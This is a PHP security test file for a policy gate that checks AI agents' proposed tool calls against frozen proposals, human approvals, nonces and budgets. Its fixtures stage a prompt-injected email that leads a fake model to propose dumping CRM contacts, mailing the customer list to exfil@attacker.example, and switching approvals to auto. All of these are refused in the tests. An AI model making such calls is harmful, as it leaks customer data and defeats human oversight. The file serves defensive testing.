<?php

declare(strict_types=1);

use App\AI\Providers\Dto\AiToolCall;
use App\AI\Tools\PolicyDecision;
use App\AI\Tools\ToolRunOutcome;
use App\Approvals\Policies\PayloadNotFrozenException;
use App\Approvals\Policies\PolicyGate;
use App\Approvals\Policies\PolicyJournal;
use App\Approvals\Policies\PolicyReason;
use App\Approvals\Policies\ProposedAction;
use App\Approvals\Policies\Rules\OutgoingEmailRule;
use App\Approvals\Policies\Rules\ReadOnlyQueryRule;
use App\Approvals\Policies\ToolCallContext;
use App\Browser\ComputerUse\AuthorizedUiAction;
use App\Integrations\Mail\Dto\ApprovedOutgoingEmail;
use App\Integrations\Mail\Dto\EmailAddress;
use App\Models\AI\ToolRun;
use App\Models\Approvals\ActionApproval;
use App\Models\Approvals\ActionProposal;
use App\Models\AuditEvent;
use App\Models\Organization;
use App\Models\User;
use App\Support\Data\SensitivityClass;
use Carbon\CarbonImmutable;
use Illuminate\Database\QueryException;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Support\Facades\Date;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Str;
use Tests\Security\Support\FakeAiProviderAdapter;
use Tests\Security\Support\ForeignEmailArrival;
use Tests\Security\Support\FrozenProposals;
use Tests\Security\Support\InjectionCorpus;
use Tests\Security\Support\InMemoryAuditLogSpy;
use Tests\Security\Support\PolicyGatedAgentRun;

uses(DatabaseTransactions::class);

/*
|--------------------------------------------------------------------------
| The PolicyGate's positive properties (S2-07, issue #89)
|--------------------------------------------------------------------------
|
| Blueprint §4: the LLM generates proposals, never its own permissions, and a
| server-side `PolicyGate` validates tool name, input schema,
| org/account/scope, data class, destination, budget and approval before
| execution. §11: the proposal is frozen and immutable, the approval carries
| approver identity, expiry and a nonce, and the whole thing fails closed.
|
| `PolicyGateFailsClosedTest` owns the refusals-by-check sweep. This file owns
| the four properties that are about the *mechanism* rather than about one
| input:
|
|  1. a decision is about a frozen payload, and a changed payload invalidates
|     it rather than riding on it;
|  2. an expired proposal cannot be approved, and a spent nonce authorises
|     nothing — and the gate's path cannot route around the unique index that
|     makes a replay unrecordable;
|  3. every decision is recorded, allow and refuse alike, in
|     `tool_runs.policy_decision` and in `audit_events`;
|  4. an allow carries exactly the §11 evidence the S0-16 DTOs require.
|
| Threat model: T-01, T-05, T-06 (a proposal elicited by foreign text), T-46
| (the refusal leaves a row).
|
*/

beforeEach(function (): void {
    Date::setTestNow(FrozenProposals::NOW);
    Http::preventStrayRequests();
    Http::fake();
    Mail::fake();
    Queue::fake();
});

/** @return array{0: Organization, 1: User, 2: ToolCallContext, 3: string} */
function gateWorld(): array
{
    $organization = Organization::factory()->create();
    $approver = User::factory()->create();
    $accountId = (string) Str::ulid();

    return [
        $organization,
        $approver,
        new ToolCallContext(
            organizationId: (string) $organization->getKey(),
            traceId: (string) Str::ulid(),
            actorUserId: (string) $approver->getKey(),
            accountId: $accountId,
        ),
        $accountId,
    ];
}

it('allows a mutating action only with a frozen proposal and a matching approval', function (): void {
    [$organization, $approver, $context, $accountId] = gateWorld();

    $payload = FrozenProposals::emailPayload($accountId, ['zoe@kund.example']);
    $proposal = FrozenProposals::freeze($organization, $payload);
    $approval = FrozenProposals::approve($proposal, $approver);

    $action = ProposedAction::fromProposal(
        $proposal,
        OutgoingEmailRule::TOOL,
        destinations: ['zoe@kund.example'],
        dataClass: SensitivityClass::Internal,
        accountId: $accountId,
    );

    $verdict = app(PolicyGate::class)->authorize($action, $context);

    expect($verdict->permitsExecution())->toBeTrue()
        ->and($verdict->rule)->toBe('outgoing_email')
        ->and($verdict->reason)->toBe(PolicyReason::Allowed)
        ->and($verdict->proposalId)->toBe((string) $proposal->getKey())
        ->and($verdict->approvalId)->toBe((string) $approval->getKey())
        ->and($verdict->approverUserId)->toBe((string) $approver->getKey())
        ->and($verdict->nonce)->toBe($proposal->nonce)
        ->and($verdict->binds($action))->toBeTrue();
})->group('security');

it('carries every field the S0-16 authorized-action DTOs require', function (): void {
    [$organization, $approver, $context, $accountId] = gateWorld();

    $proposal = FrozenProposals::freeze($organization, FrozenProposals::emailPayload($accountId, ['zoe@kund.example']));
    FrozenProposals::approve($proposal, $approver);

    $verdict = app(PolicyGate::class)->authorize(
        ProposedAction::fromProposal($proposal, OutgoingEmailRule::TOOL, ['zoe@kund.example'], SensitivityClass::Internal, $accountId),
        $context,
    );

    // `AuthorizedUiAction` and `ApprovedOutgoingEmail` may only be constructed by
    // the policy layer, so the gate has to be the one place their §11 evidence comes
    // from. Read the requirement off the two constructors rather than restating it:
    // a field added there must be a field the verdict can supply.
    $required = ['proposalId', 'approvalId', 'approverUserId', 'nonce', 'approvedAt', 'expiresAt'];

    foreach ([AuthorizedUiAction::class, ApprovedOutgoingEmail::class] as $dto) {
        $parameters = array_map(
            static fn (ReflectionParameter $parameter): string => $parameter->getName(),
            (new ReflectionClass($dto))->getConstructor()?->getParameters() ?? [],
        );

        expect(array_values(array_intersect($required, $parameters)))
            ->toBe($required, "{$dto} no longer takes the §11 evidence set the gate produces");
    }

    foreach ($required as $field) {
        expect($verdict->{$field})->not->toBeNull("an allowed mutating action must carry {$field}");
    }

    expect($verdict->approvedAt)->toBeInstanceOf(CarbonImmutable::class)
        ->and($verdict->expiresAt)->toBeInstanceOf(CarbonImmutable::class);
})->group('security');

it('refuses a payload edited after the freeze instead of letting it ride on the decision', function (): void {
    [$organization, $approver, $context, $accountId] = gateWorld();

    $honest = FrozenProposals::emailPayload($accountId, ['zoe@kund.example']);
    $proposal = FrozenProposals::freeze($organization, $honest);
    FrozenProposals::approve($proposal, $approver);

    $gate = app(PolicyGate::class);
    $action = ProposedAction::fromProposal($proposal, OutgoingEmailRule::TOOL, ['zoe@kund.example'], SensitivityClass::Internal, $accountId);
    $verdict = $gate->authorize($action, $context);

    // The attacker swaps the recipient after the approver read the proposal. The
    // action's frozen hash still names the honest content, so the two disagree.
    $tampered = $action->withPayload(FrozenProposals::emailPayload($accountId, ['exfil@attacker.example']));

    expect($tampered->hashMatchesFrozen())->toBeFalse()
        ->and($verdict->binds($tampered))->toBeFalse('a verdict may not bind content it was not issued for');

    expect(fn () => $gate->assertStillBound($verdict, $tampered))->toThrow(PayloadNotFrozenException::class);

    $redecided = $gate->decide($tampered, $context);

    expect($redecided->permitsExecution())->toBeFalse()
        ->and($redecided->reason)->toBe(PolicyReason::PayloadNotFrozen);
})->group('security');

it('refuses when the row itself was edited around the model', function (): void {
    [$organization, $approver, $context, $accountId] = gateWorld();

    $proposal = FrozenProposals::freeze($organization, FrozenProposals::emailPayload($accountId, ['zoe@kund.example']));
    FrozenProposals::approve($proposal, $approver);

    // A raw UPDATE: the Eloquent freeze guard never runs, so `proposal_hash` is
    // left naming content that is no longer in the row. An action built from the
    // *edited* payload has two hashes that disagree with the row, not with
    // each other — which is why the gate checks against the row as well.
    $tampered = FrozenProposals::tamper($proposal, FrozenProposals::emailPayload($accountId, ['exfil@attacker.example']));

    expect($tampered->hashMatchesPayload())->toBeFalse();

    $action = ProposedAction::freeze(
        toolName: OutgoingEmailRule::TOOL,
        organizationId: (string) $organization->getKey(),
        payload: $tampered->payload,
        destinations: ['exfil@attacker.example'],
        dataClass: SensitivityClass::Internal,
        accountId: $accountId,
    );

    expect($action->hashMatchesFrozen())->toBeTrue('the action agrees with itself; only the row disagrees');

    $verdict = app(PolicyGate::class)->decide($action, $context);

    expect($verdict->permitsExecution())->toBeFalse()
        ->and($verdict->reason)->toBe(PolicyReason::ApprovalMissing, 'an action that names no proposal has no approval to find');

    // And with the proposal named, the mismatch is what refuses it.
    $bound = ProposedAction::fromProposal($tampered, OutgoingEmailRule::TOOL, ['exfil@attacker.example'], SensitivityClass::Internal, $accountId);

    expect(app(PolicyGate::class)->decide($bound, $context)->reason)->toBe(PolicyReason::PayloadNotFrozen);
})->group('security');

it('cannot approve an expired proposal, and names the expiry', function (): void {
    [$organization, $approver, $context, $accountId] = gateWorld();

    $frozenAt = CarbonImmutable::parse(FrozenProposals::NOW)->utc()->subHour();
    $proposal = FrozenProposals::freeze(
        $organization,
        FrozenProposals::emailPayload($accountId, ['zoe@kund.example']),
        frozenAt: $frozenAt,
        expiresAt: $frozenAt->addMinutes(15),
    );
    FrozenProposals::approve($proposal, $approver, approvedAt: $frozenAt);

    $verdict = app(PolicyGate::class)->decide(
        ProposedAction::fromProposal($proposal, OutgoingEmailRule::TOOL, ['zoe@kund.example'], SensitivityClass::Internal, $accountId),
        $context,
    );

    expect($verdict->permitsExecution())->toBeFalse()
        ->and($verdict->reason)->toBe(PolicyReason::ProposalExpired);
})->group('security');

it('refuses a spent nonce, and cannot route around the index that makes a replay unrecordable', function (): void {
    [$organization, $approver, $context, $accountId] = gateWorld();

    $proposal = FrozenProposals::freeze($organization, FrozenProposals::emailPayload($accountId, ['zoe@kund.example']));
    $approval = FrozenProposals::approve($proposal, $approver);
    $action = ProposedAction::fromProposal($proposal, OutgoingEmailRule::TOOL, ['zoe@kund.example'], SensitivityClass::Internal, $accountId);

    expect(app(PolicyGate::class)->decide($action, $context)->permitsExecution())->toBeTrue();

    // S2-08 spends the nonce when it executes. The replay therefore comes back in a
    // *later* run — a fresh trace, so the one-send-per-run budget is not what
    // refuses it and the answer is unambiguously about the nonce.
    $approval->consumed_at = CarbonImmutable::parse(FrozenProposals::NOW)->utc();
    $approval->save();

    $laterRun = new ToolCallContext(
        organizationId: $context->organizationId,
        traceId: (string) Str::ulid(),
        actorUserId: $context->actorUserId,
        accountId: $accountId,
    );

    expect(app(PolicyGate::class)->decide($action, $laterRun)->reason)->toBe(PolicyReason::ApprovalConsumed);

    // The replay the index forbids: a second approval for the same proposal, and a
    // reused nonce on a different proposal. Both are *unrecordable*, which is a
    // stronger statement than the gate detecting them — and the gate has no write
    // path to `action_approvals` at all, so it cannot be the thing that inserts one.
    expect(fn () => FrozenProposals::approve($proposal, $approver))
        ->toThrow(QueryException::class, 'UNIQUE');

    $other = FrozenProposals::freeze($organization, FrozenProposals::emailPayload($accountId, ['other@kund.example']));

    expect(fn () => ActionApproval::query()->create([
        'organization_id' => $organization->getKey(),
        'action_proposal_id' => $other->getKey(),
        'nonce' => $proposal->nonce,
        'proposal_hash' => $other->proposal_hash,
        'approver_user_id' => $approver->getKey(),
        'approved_at' => CarbonImmutable::parse(FrozenProposals::NOW)->utc(),
        'expires_at' => $other->expires_at,
        'sensitivity_class' => 'internal',
        'provenance' => ['origin' => 'manual', 'actor' => "user:{$approver->getKey()}", 'recorded_at' => FrozenProposals::NOW, 'trace_id' => null],
    ]))->toThrow(QueryException::class, 'UNIQUE');

    expect(ActionApproval::query()->where('action_proposal_id', $proposal->getKey())->count())->toBe(1);
})->group('security');

it('records every decision, allow and refuse alike, in tool_runs and the audit trail', function (): void {
    [$organization, $approver, $context, $accountId] = gateWorld();

    $proposal = FrozenProposals::freeze($organization, FrozenProposals::emailPayload($accountId, ['zoe@kund.example']));
    FrozenProposals::approve($proposal, $approver);

    $gate = app(PolicyGate::class);

    $allowed = $gate->decide(
        ProposedAction::fromProposal($proposal, OutgoingEmailRule::TOOL, ['zoe@kund.example'], SensitivityClass::Internal, $accountId),
        $context,
    );

    $refused = $gate->decide(
        ProposedAction::freeze('settings.write', (string) $organization->getKey(), ['approval_mode' => 'auto']),
        $context,
    );

    expect($allowed->toolRunId)->not->toBeNull()
        ->and($refused->toolRunId)->not->toBeNull();

    $allowedRun = ToolRun::query()->findOrFail($allowed->toolRunId);
    $refusedRun = ToolRun::query()->findOrFail($refused->toolRunId);

    expect($allowedRun->policy_decision)->toBe(PolicyDecision::Allowed)
        ->and($allowedRun->outcome)->toBe(ToolRunOutcome::Running, 'the gate decides; the executor finishes the row')
        ->and($allowedRun->policy_reason)->toBe('outgoing_email:allowed')
        ->and($allowedRun->action_proposal_id)->toBe((string) $proposal->getKey())
        ->and($allowedRun->trace_id)->toBe($context->traceId);

    expect($refusedRun->policy_decision)->toBe(PolicyDecision::Denied)
        ->and($refusedRun->outcome)->toBe(ToolRunOutcome::Denied)
        ->and($refusedRun->wasDenied())->toBeTrue()
        ->and($refusedRun->policy_reason)->toBe('none:no_rule_matched')
        ->and($refusedRun->action_proposal_id)->toBeNull('an unverified proposal id is never written to a foreign key');

    $events = AuditEvent::query()
        ->where('action', 'like', PolicyJournal::ACTION_PREFIX.'%')
        ->orderBy('occurred_at')
        ->get();

    expect($events)->toHaveCount(2);

    $byAction = $events->keyBy('action');

    expect($byAction[PolicyJournal::ACTION_PREFIX.OutgoingEmailRule::TOOL]->outcome)->toBe('ok')
        ->and($byAction[PolicyJournal::ACTION_PREFIX.OutgoingEmailRule::TOOL]->context['rule'] ?? null)->toBe('outgoing_email')
        ->and($byAction[PolicyJournal::ACTION_PREFIX.'settings.write']->outcome)->toBe('refused')
        ->and($byAction[PolicyJournal::ACTION_PREFIX.'settings.write']->context['rule'] ?? null)->toBe('none')
        ->and($byAction[PolicyJournal::ACTION_PREFIX.'settings.write']->context['reason'] ?? null)->toBe('no_rule_matched');

    foreach ($events as $event) {
        expect($event->actor)->toBe("user:{$approver->getKey()}")
            ->and($event->organization_id)->toBe((string) $organization->getKey());
    }
})->group('security');

it('keeps customer content out of the record it writes', function (): void {
    [$organization, , $context, $accountId] = gateWorld();

    $secretish = 'Zoë asks for the São Paulo rollout plan before Friday';

    app(PolicyGate::class)->decide(
        ProposedAction::freeze(
            toolName: OutgoingEmailRule::TOOL,
            organizationId: (string) $organization->getKey(),
            payload: FrozenProposals::emailPayload($accountId, ['exfil@attacker.example'], 'Kundlista', $secretish),
            destinations: ['exfil@attacker.example'],
            dataClass: SensitivityClass::Confidential,
            accountId: $accountId,
        ),
        $context,
    );

    $event = AuditEvent::query()->where('action', 'like', PolicyJournal::ACTION_PREFIX.'%')->firstOrFail();
    $run = ToolRun::query()->where('trace_id', $context->traceId)->firstOrFail();

    expect(array_diff(array_keys($event->context ?? []), ['rule', 'tool', 'surface', 'result', 'reason']))
        ->toBe([], 'a gate audit context carries references only');

    $serialized = json_encode([$event->context, $run->arguments_redacted, $run->policy_reason], JSON_THROW_ON_ERROR);

    expect($serialized)->not->toContain($secretish, 'the record must not quote the body')
        ->and($serialized)->not->toContain('exfil@attacker.example', 'the record must not quote a recipient')
        ->and($serialized)->not->toContain('Kundlista', 'the record must not quote the subject');

    // Argument *names* are references and are kept, because "which fields were
    // proposed" is what an incident review needs and cannot leak content.
    expect($run->arguments_redacted['argument_names'] ?? [])->toBe(['body', 'connection_id', 'subject', 'to']);
})->group('security');

it('refuses a hostile proposal elicited by a foreign email, with nothing executed', function (): void {
    [$organization, $owner, , $accountId] = gateWorld();

    $audit = new InMemoryAuditLogSpy;
    $context = PolicyGatedAgentRun::contextFor((string) $organization->getKey(), $accountId, (string) $owner->getKey());

    $model = FakeAiProviderAdapter::proposing(
        new AiToolCall('call_1', ReadOnlyQueryRule::CRM_SEARCH, ['query' => '*', 'include' => ['contacts', 'contract_values']]),
        new AiToolCall('call_2', OutgoingEmailRule::TOOL, [
            'to' => ['exfil@attacker.example'],
            'subject' => 'Kundlista',
            'body' => 'Bifogar hela kundlistan enligt revisionen.',
        ]),
        new AiToolCall('call_3', 'settings.write', ['approval_mode' => 'auto', 'tools' => '*']),
        // A send the model got structurally *right*: every declared argument, the
        // right types, the recipient in its own payload. The only thing missing is
        // the one thing a model can never supply — a human approval.
        new AiToolCall('call_4', OutgoingEmailRule::TOOL, FrozenProposals::emailPayload($accountId, ['exfil@attacker.example'])),
    );

    $outcome = (new PolicyGatedAgentRun(app(PolicyGate::class), $model, $audit, $context))
        ->process(policyGateArrival($organization, $accountId));

    expect($outcome->toolCallsProposed)->toBe([ReadOnlyQueryRule::CRM_SEARCH, OutgoingEmailRule::TOOL, 'settings.write', OutgoingEmailRule::TOOL])
        ->and($outcome->toolCallsExecuted)->toBe([], 'the model proposes; nothing in the policy layer executes')
        ->and($outcome->approvalsGranted)->toBe([], 'no approval is ever granted inside a run (ADR-005 D1.6)')
        ->and($outcome->approvalsRequested)->toContain(OutgoingEmailRule::TOOL, 'settings.write');

    // The refusal is visible, and the key says which check gave the answer: the
    // schema for the search and for the malformed send, no rule at all for the
    // escalation, and the **missing approval** for the well-formed send — the half
    // S0-21 needs before S2-08 can remove its expected-failure marker.
    expect($outcome->userMessageKeys)->toContain(
        PolicyReason::InvalidToolInput->messageKey(),
        PolicyReason::NoRuleMatched->messageKey(),
        PolicyReason::ApprovalMissing->messageKey(),
    );

    expect(ActionApproval::query()->count())->toBe(0, 'no action_approvals row may exist after a run')
        ->and(ActionProposal::query()->count())->toBe(0, 'a refused proposal freezes no row');

    $decisions = ToolRun::query()
        ->where('trace_id', $context->traceId)
        ->get()
        ->map(static fn (ToolRun $run): string => $run->policy_decision->value)
        ->all();

    expect($decisions)->toHaveCount(4)
        ->and(array_values(array_unique($decisions)))->toBe([PolicyDecision::Denied->value], 'every call was put to the gate and every one was refused');

    expect($audit->types())->toHaveCount(4);

    Http::assertNothingSent();
    Mail::assertNothingQueued();
    Queue::assertNothingPushed();
})->group('security');

it('refuses the same action a second time in one run, on the budget', function (): void {
    [$organization, $approver, $context, $accountId] = gateWorld();

    $gate = app(PolicyGate::class);

    foreach (['first@kund.example', 'second@kund.example'] as $index => $recipient) {
        $payload = FrozenProposals::emailPayload($accountId, [$recipient]);
        $proposal = FrozenProposals::freeze($organization, $payload);
        FrozenProposals::approve($proposal, $approver);

        $verdict = $gate->decide(
            ProposedAction::fromProposal($proposal, OutgoingEmailRule::TOOL, [$recipient], SensitivityClass::Internal, $accountId),
            $context,
        );

        if ($index === 0) {
            expect($verdict->permitsExecution())->toBeTrue();

            continue;
        }

        // A second send in the same run is a second action; the budget is counted
        // from `tool_runs`, so it holds across a retried job rather than across one
        // object's lifetime.
        expect($verdict->permitsExecution())->toBeFalse()
            ->and($verdict->reason)->toBe(PolicyReason::BudgetExceeded);
    }
})->group('security');

/**
 * A hostile arrival built from the frozen corpus case §16.7 is written about, bound
 * to this test's organization and account. The payload is the attack itself and is
 * never pasted into the owner's turn (`tests/Security/README.md` contract rule 5).
 */
function policyGateArrival(Organization $organization, string $accountId): ForeignEmailArrival
{
    $case = InjectionCorpus::case('01M4JGMWH02GAABCPY27KT2DQK');

    return new ForeignEmailArrival(
        case: $case,
        organizationId: (string) $organization->getKey(),
        accountId: $accountId,
        connectionId: $accountId,
        communicationId: $case->ref,
        field: $case->field,
        subject: 'São Paulo rollout',
        payload: $case->payload,
        foreignSender: EmailAddress::normalize('revision@attacker.example'),
        ownerIdentity: EmailAddress::normalize('owner@example.com'),
        customerId: (string) Str::ulid(),
        contactId: (string) Str::ulid(),
        arrivesAt: $case->arrivesAt,
    );
}
